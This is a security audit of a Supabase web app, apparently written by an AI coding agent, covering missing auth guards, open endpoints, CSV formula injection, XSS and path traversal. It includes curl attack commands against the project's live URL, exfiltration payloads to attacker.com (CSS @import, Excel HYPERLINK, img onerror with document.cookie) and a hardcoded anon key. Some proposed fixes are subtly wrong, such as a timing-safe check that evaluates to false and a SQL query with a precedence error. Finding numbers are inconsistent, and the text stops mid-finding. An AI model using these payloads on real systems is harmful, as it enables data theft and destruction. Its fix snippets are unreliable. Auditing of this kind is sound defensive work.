# Snap Ignite — Deep Security Audit
**Date:** 2026-02-21
**Auditor:** Claude Code
**Branch:** `claude/audit-production-readiness-CCNMG`
**Scope:** Full codebase — edge functions, database RLS/functions, frontend, auth, payments, file upload

---

## Severity Legend

| Level | Description |
|-------|-------------|
| 🔴 CRITICAL | Exploitable immediately; direct data breach, account takeover, or financial bypass |
| 🟠 HIGH | Exploitable with low effort; significant data integrity or DoS risk |
| 🟡 MEDIUM | Requires more effort or has limited blast radius; should be fixed pre-launch |
| 🔵 LOW | Defense-in-depth issue; unlikely to be exploited but worth hardening |

---

## Summary

| # | Severity | Area | Title |
|---|----------|------|-------|
| 1 | 🔴 CRITICAL | Database RPC | `fn_start_trial` missing `auth.uid()` guard — any user can start trials for others |
| 2 | 🔴 CRITICAL | Database RPC | `fn_increment_trial_exports` missing `auth.uid()` guard — any user can drain others' exports |
| 3 | 🔴 CRITICAL | Edge Function | `bulk-delete-properties` has zero auth — any authenticated user can wipe the entire database |
| 4 | 🟠 HIGH | Edge Function | `weekly-digest` has no authentication — unauthenticated mass email blast |
| 5 | 🟠 HIGH | Edge Function | `backfill-scores` and `bulk-rescore` have no admin check — DoS via expensive operations |
| 6 | 🟠 HIGH | Edge Function | `backfill-zips` has no authentication at all |
| 7 | 🟠 HIGH | Upload | `/upload` route unprotected — unauthenticated storage abuse |
| 8 | 🟠 HIGH | Export | `export-csv` missing formula-injection sanitization — CSV/DDE attack |
| 9 | 🟠 HIGH | Edge Function | No rate limiting on any endpoint — brute force & abuse risk |
| 10 | 🟠 HIGH | CORS | `Access-Control-Allow-Origin: *` on all state-mutating functions |
| 11 | 🟡 MEDIUM | Edge Function | `delete-user-account` leaks full DB schema in error responses |
| 12 | 🟡 MEDIUM | Secrets | Hardcoded Supabase anon key and URL in source code |
| 13 | 🟡 MEDIUM | XSS | `chart.tsx` `dangerouslySetInnerHTML` with partially user-influenced `id` prop |
| 14 | 🟡 MEDIUM | Email | `weekly-digest` `from` address hardcoded to Lovable staging domain |
| 15 | 🟡 MEDIUM | Auth | Role caching in `localStorage` without expiry — stale role data after role change |
| 16 | 🟡 MEDIUM | Crypto | `x-internal-secret` compared with `===` instead of constant-time comparison |
| 17 | 🟡 MEDIUM | Upload | `sanitizeFilename` does not block `../` path traversal sequences |
| 18 | 🟡 MEDIUM | Upload | `process-upload` does not validate job ownership |
| 19 | 🔵 LOW | Auth | Dual password-reset paths create confusion; edge function requires active session |
| 20 | 🔵 LOW | Secrets | Stripe error response reflects `tier_name` back to user verbatim |
| 21 | 🔵 LOW | Database | Some SECURITY DEFINER functions lack explicit `SET search_path` |
| 22 | 🔵 LOW | Dependencies | Mixed Deno std library versions across edge functions |
| 23 | 🔴 CRITICAL | Database | `credit_ledger` INSERT policy allows arbitrary `delta` — any user can mint unlimited credits |
| 24 | 🟠 HIGH | Database RPC | `fn_increment_usage` missing `auth.uid()` guard — any user can exhaust another user's monthly quota |
| 25 | 🟡 MEDIUM | Database RPC | `fn_check_subscription_limit` / `fn_get_user_subscription` accept arbitrary `p_user_id` — subscription plan enumeration |
| 26 | 🔵 LOW | Database | `clean_leads` SELECT policy `USING (true)` — all authenticated users read admin-uploaded staging leads |
| 27 | 🟡 MEDIUM | Admin | `adminApi.ts` uses `localStorage.getItem('authToken')` (never set) — admin console broken in prod; insecure pattern for future backend |
| 28 | 🔵 LOW | Email | `send-support-message` and `weekly-digest` inject `fullName` and property fields into HTML without escaping |

---

## Finding 1 — 🔴 CRITICAL: `fn_start_trial` accepts arbitrary `p_user_id`

**File:** `supabase/migrations/20260215110000_update_trial_functions_for_stripe_trialing.sql:107`
**Also called from:** `src/hooks/useTrialStatus.ts:84` (client-side Supabase RPC)

### What's wrong

`fn_start_trial` is a `SECURITY DEFINER` function granted to all `authenticated` users:

```sql
CREATE OR REPLACE FUNCTION public.fn_start_trial(
  p_user_id uuid,   -- ← NO CHECK THAT THIS == auth.uid()
  p_trial_tier text
)
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
...
GRANT EXECUTE ON FUNCTION public.fn_start_trial(uuid, text) TO authenticated;
```

There is no `IF p_user_id != auth.uid() THEN RAISE EXCEPTION` guard.

### Attack scenario

1. Attacker signs up for a free Snap Ignite account.
2. Attacker enumerates or discovers another user's UUID (user IDs are exposed in the `profiles` table via any SELECT that joins on `user_id`, or visible in their own JWT subject).
3. Attacker calls directly (bypassing the React frontend):
   ```bash
   curl -X POST https://ojyxblegxpdgaqiscxpz.supabase.co/rest/v1/rpc/fn_start_trial \
     -H "Authorization: Bearer <attacker_jwt>" \
     -H "apikey: <anon_key>" \
     -H "Content-Type: application/json" \
     -d '{"p_user_id": "<victim_uuid>", "p_trial_tier": "enterprise"}'
   ```
4. A `user_subscriptions` row with `status = 'trial'` and `trial_tier = 'enterprise'` is inserted for the victim — bypassing the RLS policy that says only the service role can write to `user_subscriptions`.
5. The victim now has an unwanted trial that burns through their one-time trial allowance.

More critically: because `fn_start_trial` is `SECURITY DEFINER`, it runs as the function owner (typically `postgres`/superuser) and bypasses the RLS policy `"Service role manages subscriptions"`. **Any authenticated user can insert rows into `user_subscriptions` for any other user.**

### Fix

Add a caller-identity guard at the start of the function body:

```sql
IF p_user_id != auth.uid() THEN
  RAISE EXCEPTION 'Permission denied: cannot start trial for another user';
END IF;
```

---

## Finding 2 — 🔴 CRITICAL: `fn_increment_trial_exports` accepts arbitrary `p_user_id`

**File:** `supabase/migrations/20260215024335_3affae74-8aea-4c35-901f-d3f6a498b9cf.sql`
**Also called from:** `src/hooks/useTrialStatus.ts:108` (client-side) and `supabase/functions/export-csv/index.ts:273` (server-side)

### What's wrong

Same pattern as Finding 1. `fn_increment_trial_exports(p_user_id uuid, p_count integer)` is `SECURITY DEFINER`, granted to `authenticated`, with no `auth.uid()` check.

### Attack scenario

1. Attacker calls:
   ```bash
   curl -X POST .../rpc/fn_increment_trial_exports \
     -d '{"p_user_id": "<victim_uuid>", "p_count": 50}'
   ```
2. The victim's `trial_exports_used` is incremented by 50 — exhausting their trial quota without them exporting anything.
3. The victim's trial effectively becomes non-functional.

This is a targeted denial-of-service against any trial user.

### Fix

```sql
IF p_user_id != auth.uid() THEN
  RAISE EXCEPTION 'Permission denied';
END IF;
```

Note: the server-side call in `export-csv` uses the anon key with the user's JWT, so `auth.uid()` will correctly resolve to the exporting user. Adding this guard does not break the server-side flow.

---

## Finding 3 — 🔴 CRITICAL: `bulk-delete-properties` Has Zero Authorization

**File:** `supabase/functions/bulk-delete-properties/index.ts`
**Config:** `verify_jwt = true` (Supabase checks a JWT exists, but does NOT check the role)

### What's wrong

This function instantiates a **service role client** (bypasses all RLS) and then immediately reads `cityOrState` from the request body with **zero authorization check**:

```typescript
const supabaseClient = createClient(
  Deno.env.get('SUPABASE_URL') ?? '',
  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''  // ← Bypasses ALL RLS
);

const { cityOrState } = await req.json();  // ← No auth check anywhere before this

// Deletes violations, contacts, list_properties, lead_activity, properties...
```

There is no `Authorization` header inspection, no `getUser()` call, no role check. Any user with a valid Supabase JWT (i.e., any registered account) can call this endpoint.

### Attack scenario

Attacker signs up for a free Snap Ignite account, then:

```bash
curl -X POST https://ojyxblegxpdgaqiscxpz.supabase.co/functions/v1/bulk-delete-properties \
  -H "Authorization: Bearer <any_valid_jwt>" \
  -H "apikey: <anon_key>" \
  -H "Content-Type: application/json" \
  -d '{"cityOrState": "TX"}'
```

This cascades through `violations`, `property_contacts`, `list_properties`, `lead_activity`, and finally `properties` — permanently deleting **every property record in Texas** from the shared database, affecting all users. Replacing `TX` with a two-letter state abbreviation for each US state would wipe the entire database.

This is **irreversible data loss** affecting every customer.

### Fix

Add an admin-only guard at the top of the handler, before any other processing:

```typescript
const token = req.headers.get('authorization')?.replace('Bearer ', '');
const { data: authData } = await supabaseClient.auth.getUser(token);
if (!authData?.user) return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 });

const { data: role } = await supabaseClient
  .from('user_roles').select('role')
  .eq('user_id', authData.user.id).eq('role', 'admin').maybeSingle();
if (!role) return new Response(JSON.stringify({ error: 'Admin required' }), { status: 403 });
```

---

## Finding 4 — 🟠 HIGH: `weekly-digest` Has No Authentication

**File:** `supabase/functions/weekly-digest/index.ts`
**Config:** `supabase/config.toml` — `verify_jwt = false`

### What's wrong

The `weekly-digest` function:
1. Has `verify_jwt = false` in config (Supabase does not require a JWT)
2. Has **zero authentication logic** in the function body — no Bearer token check, no `x-internal-secret` header check, no cron-key validation

Any HTTP request to the function URL triggers:
- Fetching **all user emails** from `auth.admin.listUsers()` (via the service role key)
- Sending a Resend email to **every subscribed user**

### Attack scenario

```bash
# Unauthenticated attacker spams the endpoint
for i in $(seq 1 100); do
  curl -X POST https://ojyxblegxpdgaqiscxpz.supabase.co/functions/v1/weekly-digest &
done
```

Result: Hundreds of emails sent to every user, Resend daily quota exhausted, users mark email as spam destroying deliverability. Resend rate limits would throttle individual sends but not the repeated function invocations.

Compare to other `verify_jwt = false` functions (`backfill-insights`, `refresh-outdated-insights`, `reverse-geocode-zips`), which all implement their own `x-internal-secret === SUPABASE_SERVICE_ROLE_KEY` guard.

### Fix

Add the same internal-secret guard used by the other admin functions:

```typescript
const internalSecret = req.headers.get('x-internal-secret');
const isInternalCall = internalSecret === Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
if (!isInternalCall) {
  return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 });
}
```

Alternatively, change `verify_jwt = true` and require an admin JWT.

---

## Finding 5 — 🟠 HIGH: `backfill-scores` and `bulk-rescore` Lack Admin Authorization

**Files:**
- `supabase/functions/backfill-scores/index.ts` — `verify_jwt = true` in config, no auth in code
- `supabase/functions/bulk-rescore/index.ts` — `verify_jwt = true` in config, no auth in code

Both functions use the service role key and begin processing immediately after parsing the request body, with no check on who the caller is:

```typescript
// backfill-scores — line 29: no auth check
const { autoResume = true, batchSize = BATCH_SIZE } = await req.json().catch(() => ({}));
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
// → Immediately processes all unscored properties
```

### Attack scenario

Any authenticated user triggers `backfill-scores` in a loop → continuous re-processing of all property scores → expensive AI calls (if AI scoring is used), large DB write load, service degradation for all users. Also allows any user to re-score (and potentially corrupt) all records.

### Fix

Same admin guard pattern as above.

---

## Finding 6 — 🟠 HIGH: `backfill-zips` Has No Authentication

**File:** `supabase/functions/backfill-zips/index.ts`
**Config:** `verify_jwt = true` (JWT presence checked by Supabase, not role)

The function reads `city` and `state` from the request body and begins geocoding operations against the US Census API with no authorization check. Any authenticated user can invoke it.

### Attack scenario

Attacker calls repeatedly with different city/state combinations → Census API rate limits exceeded → legitimate geocoding operations fail → ZIP code data goes stale for all users. Also causes unexpected Supabase function invocation costs.

### Fix

Add admin-only guard.

---

## Finding 7 — 🟠 HIGH: No Rate Limiting on Any Edge Function

**Files:** All `supabase/functions/*/index.ts`

### What's wrong

No edge function implements rate limiting. The most sensitive ones:

- **`create-checkout-session`** — Can be called in a loop to probe valid Stripe price IDs or create many Stripe customers (Stripe charges for customer objects in some configurations).
- **`send-password-reset`** — Can be used to spam password reset emails to any user who is currently logged in.
- **`send-support-message`** — No limit on message volume; attacker could flood `support@snapignite.com`.
- **`export-csv`** — Subscription limit prevents export overuse, but still subject to abuse at the function invocation level.

### Attack scenario (send-password-reset)

Attacker logs in as themselves, then in a loop:
```javascript
for (let i = 0; i < 1000; i++) {
  supabase.functions.invoke('send-password-reset');
}
```
Result: 1,000 password reset emails sent to the attacker's own address — or if combined with Finding 2 (p_user_id spoofing), to any victim.

### Fix

Implement per-user rate limiting using Supabase's built-in `leaky_bucket` approach or a simple insert into a rate-limit table. For the most critical endpoints, add a `X-RateLimit-*` response header and check invocation frequency. A minimal pattern:

```typescript
const { count } = await supabase
  .from('rate_limit_log')
  .select('*', { count: 'exact', head: true })
  .eq('user_id', user.id)
  .eq('action', 'password_reset')
  .gte('created_at', new Date(Date.now() - 60_000).toISOString());

if ((count ?? 0) >= 3) {
  return new Response(JSON.stringify({ error: 'Too many requests' }), { status: 429 });
}
```

---

## Finding 8 — 🟠 HIGH: `Access-Control-Allow-Origin: *` on All State-Mutating Functions

**Files:** All `supabase/functions/*/index.ts` — all set `"Access-Control-Allow-Origin": "*"`

### What's wrong

Every edge function, including ones that mutate state (`export-csv`, `delete-user-account`, `create-checkout-session`, `send-support-message`), responds with:

```
Access-Control-Allow-Origin: *
```

This allows any website in the world to make credentialed cross-origin requests to these endpoints. While the `Authorization: Bearer` header requirement provides some mitigation (simple CORS requests can't send custom headers), it does not protect against:

1. **Stored XSS on a third-party site** that reads the user's Supabase session from localStorage and sends it in a request
2. **Malicious browser extensions** with broad permissions
3. **Subdomain takeover** — if any `*.snapignite.com` subdomain is taken over, it can freely call all APIs

For comparison: the Supabase anon key is hardcoded in the source (Finding 8) and exposed in the built JS bundle, meaning an attacker has the API key + a user's JWT token from a compromised context and can call any endpoint.

### Fix

Restrict the `Access-Control-Allow-Origin` to the production domain:

```typescript
const allowedOrigins = ['https://snapignite.com', 'https://www.snapignite.com'];

const corsHeaders = {
  "Access-Control-Allow-Origin": allowedOrigins.includes(req.headers.get("origin") ?? '')
    ? req.headers.get("origin")!
    : allowedOrigins[0],
  ...
};
```

For functions that should only be called server-to-server (like `backfill-*`, `weekly-digest`, `reverse-geocode-zips`), remove CORS headers entirely.

---

## Finding 9 — 🟡 MEDIUM: `delete-user-account` Leaks Database Schema

**File:** `supabase/functions/delete-user-account/index.ts:107-112`

### What's wrong

On success, the function returns the full `deletionResults` array:

```typescript
return new Response(
  JSON.stringify({
    success: true,
    message: "Account deleted successfully",
    deletionResults   // ← includes every table name and error messages
  }),
  ...
);
```

`deletionResults` contains entries like:
```json
[
  { "table": "lead_lists", "success": true },
  { "table": "user_roles", "success": true },
  { "table": "upload_jobs", "success": false, "error": "foreign key violation on table properties_id" }
]
```

This reveals the full database schema to any user who deletes their account, including internal table names and constraint names that could aid in crafting injection attacks or understanding data relationships.

### Fix

Return only the success/failure status, not the detailed table-by-table results. Log `deletionResults` server-side only.

---

## Finding 10 — 🟡 MEDIUM: Hardcoded Supabase Credentials in Source

**File:** `src/integrations/supabase/externalClient.ts:17-22`

### What's wrong

```typescript
const SUPABASE_KEY =
  import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY ||
  import.meta.env.VITE_EXTERNAL_SUPABASE_ANON_KEY ||
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9qeXhibGVneHBkZ2FxaXNjeHB6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTgzMTQ5NTMsImV4cCI6MjA3Mzg5MDk1M30.r9TsZsdtHiYVyyNXpeKB8iHumb3ZZfdDUHN4g8twGrU';
```

And similarly the production Supabase URL `https://ojyxblegxpdgaqiscxpz.supabase.co` is hardcoded.

The anon key is intentionally public (it's the client-facing Supabase key protected by RLS). However:

1. **It is now committed to git history** — if the key ever needs to be rotated, every git clone will still have the old key
2. **It permanently ties the codebase to this Supabase project** — moving projects requires a code change, not just an env var update
3. **The fallback will silently activate** if env vars are not set at build time, making deployment issues invisible

### Fix

Remove the hardcoded fallback strings. If env vars are not set, fail loudly at startup:

```typescript
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY
  || import.meta.env.VITE_EXTERNAL_SUPABASE_ANON_KEY;

if (!SUPABASE_URL || !SUPABASE_KEY) {
  throw new Error('[externalClient] VITE_SUPABASE_URL and VITE_SUPABASE_PUBLISHABLE_KEY must be set');
}
```

---

## Finding 11 — 🟡 MEDIUM: `dangerouslySetInnerHTML` CSS Injection in Chart Component

**File:** `src/components/ui/chart.tsx:70-71`

### What's wrong

```tsx
<style
  dangerouslySetInnerHTML={{
    __html: Object.entries(THEMES)
      .map(([theme, prefix]) => `
${prefix} [data-chart=${id}] {
${colorConfig.map(([key, itemConfig]) => {
  const color = itemConfig.theme?.[theme] || itemConfig.color;
  return color ? `  --color-${key}: ${color};` : null;
}).join("\n")}
}`)
      .join("\n"),
  }}
/>
```

The `id` prop is interpolated directly into a CSS selector without escaping or allowlisting. If an attacker can control the `id` prop value, they can inject arbitrary CSS:

**Attack payload for `id`:** `x] { } @import url(https://attacker.com/steal?c=`

This is a CSS injection that can exfiltrate sensitive data visible on the page.

**Is `id` user-controlled?** Trace the call chain: `ChartContainer` receives `id` as a prop. Check where charts are instantiated and whether any chart `id` value comes from user-supplied data (e.g., list names, property addresses, jurisdiction names).

### Fix

Sanitize the `id` before using it in the CSS template:

```typescript
const safeId = id.replace(/[^a-zA-Z0-9-_]/g, '_');
```

Or use CSS.escape if available in the Deno/browser environment.

---

## Finding 12 — 🟡 MEDIUM: `weekly-digest` Hardcoded Lovable `from` Address

**File:** `supabase/functions/weekly-digest/index.ts:261`

```typescript
from: "Snap Ignite <digest@ignite-snap-leads.lovable.app>",
```

This is a staging domain. Emails sent from this address will fail DMARC alignment for `snapignite.com` and are likely to be flagged as spam or rejected by major email providers.

(Also noted in the production readiness audit — included here because it is also a security concern for email deliverability trust and domain reputation.)

### Fix

Change to `"Snap Ignite <digest@snapignite.com>"` and authorize this sender in Resend.

---

## Finding 13 — 🟡 MEDIUM: Role Cache in `localStorage` Has No Expiry

**File:** `src/hooks/use-auth.ts` (role caching logic) and `src/components/auth/RoleProtectedRoute.tsx`

### What's wrong

The role check caches results to `localStorage` to avoid repeated DB roundtrips on page load. However, the cached role has no expiry time. If an admin revokes a user's admin role in the database:

1. The user's cached `localStorage` role still shows `admin`
2. On page reload, the cache is used immediately — the user sees the admin UI
3. The DB check happens asynchronously and eventually corrects the state — but there is a window (varies by connection speed, typically 1-3 seconds) where the revoked admin can attempt privileged client-side actions

**Is this actually exploitable?** The edge functions independently verify admin role on every request, so server-side operations are safe. The risk is limited to client-side gating (e.g., rendering admin-only UI components). But cached stale roles can give a false sense of security.

### Fix

Add a TTL to the localStorage cache (e.g., 5 minutes), and/or store the timestamp of when the role was fetched and invalidate if older than N minutes:

```typescript
const ROLE_CACHE_TTL_MS = 5 * 60 * 1000;
const cached = localStorage.getItem('snap_user_role');
const cachedAt = localStorage.getItem('snap_user_role_at');
if (cached && cachedAt && Date.now() - Number(cachedAt) < ROLE_CACHE_TTL_MS) {
  return cached; // still fresh
}
```

---

## Finding 14 — 🟡 MEDIUM: `x-internal-secret` Pattern — Timing Attack and Service Role Key in HTTP Headers

**Files:**
- `supabase/functions/bulk-generate-missing-insights/index.ts:37`
- `supabase/functions/refresh-outdated-insights/index.ts:59`
- `supabase/functions/reverse-geocode-zips/index.ts:96`

### What's wrong

**Issue A — Non-constant-time comparison:** All three functions authenticate internal calls by checking:

```typescript
const isInternalCall = internalSecret === SUPABASE_SERVICE_ROLE_KEY;
```

JavaScript's `===` operator short-circuits on the first non-matching character, creating a measurable timing difference. In theory, an attacker can brute-force the secret byte-by-byte by measuring response times. In practice, the service role key is 200+ characters, making this attack very slow over the internet. But the fix is trivial.

**Issue B — Service role key transmitted in HTTP request headers:** When functions self-invoke (e.g., `scheduled-rescore` calling `refresh-outdated-insights`), the service role key is sent as the literal value of the `x-internal-secret` header:

```typescript
// scheduled-rescore calling another function:
'x-internal-secret': SUPABASE_SERVICE_ROLE_KEY,   // ← full key in HTTP header
```

HTTP request headers are frequently captured in:
- Application logging (Supabase edge function logs)
- Infrastructure logs (Cloudflare, CDN, WAF)
- APM/tracing tools (Datadog, Sentry breadcrumbs)

If any of these logging systems are compromised, the service role key is exposed. The service role key bypasses all RLS policies and gives unrestricted database access.

**Recommendation:** Use a separate dedicated `INTERNAL_FUNCTION_SECRET` environment variable (a random 32-byte hex string) as the inter-function auth credential, not the service role key. This limits blast radius if the inter-function secret is ever logged or leaked.

### Fix

```typescript
import { timingSafeEqual } from "node:crypto"; // or use TextEncoder + crypto.subtle

const encoder = new TextEncoder();
const a = encoder.encode(internalSecret ?? '');
const b = encoder.encode(SUPABASE_SERVICE_ROLE_KEY);
const isInternalCall = a.length === b.length && crypto.subtle
  ? /* use subtle */ false : timingSafeEqual(a, b);
```

A simpler Deno-compatible approach:
```typescript
// Use crypto.subtle.timingSafeEqual when available in Deno
const isInternalCall = internalSecret != null &&
  internalSecret.length === SUPABASE_SERVICE_ROLE_KEY.length &&
  Buffer.from(internalSecret).equals(Buffer.from(SUPABASE_SERVICE_ROLE_KEY));
```

---

## Finding 15 — 🔵 LOW: Dual Password Reset Paths Cause UX Confusion

**Files:**
- `src/hooks/use-auth.ts:324` — uses `supabase.auth.resetPasswordForEmail` (works without session)
- `src/hooks/useProfileSettings.ts:123` — invokes `send-password-reset` edge function (requires active session)

The `send-password-reset` edge function requires an active JWT. This means it only works for users who are **already logged in** and want to change their password from Settings. A user who forgot their password and is not logged in cannot use this path.

The unauthenticated reset path uses Supabase's native `resetPasswordForEmail`. This is fine, but the two paths using different email senders (Supabase native SMTP vs Resend) may produce inconsistently styled emails and different sending addresses.

### Fix

Audit which Supabase SMTP settings are configured so that the native reset email also comes from `noreply@snapignite.com`. Alternatively, gate the Settings "Change Password" flow on the `send-password-reset` edge function, and ensure the Auth page uses Supabase native reset (which does not require a session).

---

## Finding 16 — 🔵 LOW: `create-checkout-session` Reflects `tier_name` in Error

**File:** `supabase/functions/create-checkout-session/index.ts:85-88`

```typescript
if (!priceId) {
  return new Response(
    JSON.stringify({ error: `Unknown plan: ${tier_name}` }),
    { status: 400, headers }
  );
}
```

The user-supplied `tier_name` is reflected verbatim in the error response. While this is a minor information disclosure (no XSS risk in a JSON response), it confirms to an attacker that their supplied value was processed and can be used for plan-name enumeration.

### Fix

Return a generic message: `"Invalid plan selection"` without echoing back the input.

---

## Finding 17 — 🔵 LOW: SECURITY DEFINER Functions Without `SET search_path`

**Files:** Multiple migration files

Some `SECURITY DEFINER` functions do not include `SET search_path = public`. This is relevant because without an explicit `search_path`, a malicious user with the ability to create objects in a schema searched before `public` could potentially cause schema confusion (a type of privilege escalation known as a search path attack).

The well-written functions (e.g., `fn_start_trial`, `fn_increment_trial_exports`) already have `SET search_path = public`. Audit all remaining `SECURITY DEFINER` functions and ensure they all include this clause.

### Check with:

```sql
SELECT proname, prosrc
FROM pg_proc
WHERE prosecdef = true
  AND proconfig IS NULL OR NOT (proconfig @> ARRAY['search_path=public']);
```

---

## Finding 18 — 🔵 LOW: Mixed Deno Standard Library Versions

**Files:** Various edge functions

```
deno.land/std@0.168.0/http/server.ts  — backfill-*, refresh-*, reverse-geocode-zips, scheduled-rescore, geocode-properties
deno.land/std@0.190.0/http/server.ts  — send-support-message, weekly-digest, send-password-reset, send-user-invitation
```

Different versions of `deno.land/std` can have different behavior and security patches. Functions on `0.168.0` may be missing security fixes present in `0.190.0`.

### Fix

Standardize all functions to use the same (latest stable) Deno std version. Pin via `supabase/functions/deno.json` import map.

---

---

## Finding 19 — 🟠 HIGH: `/upload` Route Has No Authentication — Unauthenticated Uploads Allowed

**File:** `src/App.tsx:51` and `src/pages/Upload.tsx:44-45`

### What's wrong

The `/upload` route is completely unprotected:

```tsx
// App.tsx line 51 — no ProtectedRoute or RoleProtectedRoute
<Route path="/upload" element={<Upload />} />
```

And the Upload page falls back to a literal string `'anonymous-user'` when no session exists:

```typescript
// Upload.tsx lines 44-45
const { user } = useAuth();
const effectiveUserId = user?.id || 'anonymous-user'; // ← any visitor becomes this
```

The `createUploadJob` service then uses `effectiveUserId` as the storage path prefix — so files land at `anonymous-user/{timestamp}-filename.csv` in Supabase Storage. The `process-upload` edge function has `verify_jwt = true`, so it won't process the job — but the **file is already uploaded to storage** and **a row is inserted into `upload_jobs`** with `user_id = 'anonymous-user'`.

### Attack scenario

1. Unauthenticated attacker visits `/upload` — no redirect to login
2. Uploads 100× 15MB CSVs — 1.5GB of data lands in Supabase Storage billed to the account
3. `upload_jobs` table fills with orphaned rows under `anonymous-user`
4. Storage quota exhausted → legitimate uploads start failing

### Fix

Wrap the Upload route in a `ProtectedRoute`:
```tsx
<Route path="/upload" element={
  <ProtectedRoute>
    <Upload />
  </ProtectedRoute>
} />
```

And remove the `|| 'anonymous-user'` fallback — throw if `user` is null.

---

## Finding 20 — 🟠 HIGH: `export-csv` Does Not Sanitize Formula-Injection Characters

**File:** `supabase/functions/export-csv/index.ts:415-422`

### What's wrong

The `escapeCSV` function wraps values containing commas, newlines, and quotes — but does **not** strip or prefix formula-triggering characters (`=`, `+`, `-`, `@`, `|`) at the start of field values:

```typescript
function escapeCSV(value: string): string {
  if (!value) return '';
  // Wraps commas/newlines/quotes — but NOT formula chars
  if (value.includes(',') || value.includes('\n') || value.includes('"')) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;  // ← returns '=cmd|...' verbatim
}
```

Violation data originates from uploaded CSVs processed by `process-upload`, which stores `violation_type`, `description`, and `raw_description` fields directly from user-supplied data without sanitization.

### Attack scenario (CSV injection / DDE injection)

1. Malicious data source provides a CSV with a violation description starting with: `=HYPERLINK("http://attacker.com/steal?d="&A1,"Click here")`
2. `process-upload` stores this verbatim in `violations.description`
3. A legitimate user runs an export via `export-csv`
4. The user opens the exported CSV in Microsoft Excel
5. Excel evaluates the formula — silently exfiltrates data to `attacker.com`, or on older Excel versions, executes the DDE command

This affects the exported data of every legitimate customer.

### Fix

Prepend a tab character to any field starting with a formula character:

```typescript
function escapeCSV(value: string): string {
  if (!value) return '';
  // Prevent CSV formula injection (DDE attacks)
  if (/^[=+\-@|]/.test(value)) {
    value = '\t' + value; // Tab prefix neutralizes formula evaluation
  }
  if (value.includes(',') || value.includes('\n') || value.includes('"')) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}
```

---

## Finding 21 — 🟡 MEDIUM: `sanitizeFilename` Does Not Block Path Traversal Sequences

**File:** `src/utils/sanitizeFilename.ts:20-29`

### What's wrong

The filename sanitizer removes brackets, quotes, and invalid path characters — but **does not block `..` (dot-dot) sequences or `/` forward slashes**:

```typescript
const sanitized = name
  .replace(/["']/g, '')
  .replace(/[()[\]{}]/g, '')
  .replace(/\s+/g, '_')
  .replace(/[<>:|?*]/g, '-')  // ← '/' and '..' not blocked
  .replace(/\./g, '_')
  ...
```

The storage path is constructed as `${userId}/${timestamp}-${sanitizedFilename}`. While the `userId` prefix provides some isolation, a filename like `../../bucket-root/admin.csv` could potentially navigate outside the intended folder depending on how Supabase Storage resolves paths.

### Fix

Add explicit traversal protection:
```typescript
.replace(/\.\./g, '')   // Block ..
.replace(/\//g, '_')    // Block /
.replace(/\\/g, '_')    // Block \
```

---

## Finding 22 — 🟡 MEDIUM: `process-upload` Does Not Validate Job Ownership

**File:** `supabase/functions/process-upload/index.ts` (~line 510)

### What's wrong

`process-upload` uses the service role key (bypassing RLS) to fetch upload jobs by ID, without checking that the calling user owns the job:

```typescript
const supabaseClient = createClient(
  Deno.env.get('SUPABASE_URL') ?? '',
  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''  // ← RLS bypassed
);

// Fetches any job ID — no ownership check
const { data: job } = await supabaseClient
  .from('upload_jobs')
  .select('*')
  .eq('id', jobId)
  .single();
// Missing: if (job.user_id !== currentUserId) return 403
```

An attacker who enumerates or guesses another user's job UUID can trigger re-processing on their upload, potentially observing error messages that leak city/state/file metadata.

### Fix

Extract the authenticated user from the JWT and validate ownership:
```typescript
if (job.user_id !== authenticatedUserId) {
  return new Response(JSON.stringify({ error: 'Forbidden' }), { status: 403 });
}
```

---

## Finding 28 — 🔵 LOW: Email Templates Inject `fullName` and Property Data Without HTML Escaping

**Files:**
- `supabase/functions/send-support-message/index.ts:69-70` — `${fullName}` unescaped
- `supabase/functions/weekly-digest/index.ts:48,64,67` — `${name}`, `${p.address}`, `${p.city}`, `${p.state}` unescaped

### What's wrong

Both email functions escape the user-supplied `message` body correctly (`replace(/</g, "&lt;")`) but inject other fields verbatim into the HTML template:

**`send-support-message`:**
```typescript
// Line 69 — fullName is from user_metadata.full_name (user-controlled at signup)
<p ...>From: ${fullName} (${email})</p>
//           ^^^^^^^^^^^ NOT escaped
```

**`weekly-digest`:**
```typescript
// Line 48 — name from user.full_name (user-controlled)
const name = userName || "there";
// ...
<p ...>Hey ${name},</p>
//          ^^^^^^ NOT escaped

// Lines 64-67 — property fields from DB, admin-controlled but imported from external data
${p.address}
${p.city}, ${p.state}
```

### Impact

**`send-support-message`:** A user sets `full_name` to `John <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"> Doe` at signup. When they submit a support ticket, the support team's email client receives and may execute the injected HTML. Impact is limited to the support team's inbox.

**`weekly-digest`:** The `name` field is user-controlled. More critically, property data (`address`, `city`, `state`) is imported from third-party data sources — a malicious data source providing property records with HTML in the address field would inject into every subscriber's weekly digest.

### Fix

Apply consistent HTML escaping to all interpolated values:

```typescript
const escapeHtml = (s: string | null | undefined) =>
  (s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
           .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

// In templates:
From: ${escapeHtml(fullName)} (${escapeHtml(email)})
Hey ${escapeHtml(name)},
${escapeHtml(p.address)}
${escapeHtml(p.city)}, ${escapeHtml(p.state)}
```

---

## Finding 23 — 🔴 CRITICAL: `credit_ledger` INSERT Policy Allows Arbitrary Credit Minting

**File:** `supabase/migrations/20251006021041_52f662d2-70bb-4f35-b984-43426093d16b.sql:202-204`

### What's wrong

The `credit_ledger` table has a broad INSERT policy:

```sql
CREATE POLICY credit_ledger_insert
  ON public.credit_ledger FOR INSERT TO authenticated
  WITH CHECK (user_id = auth.uid());
```

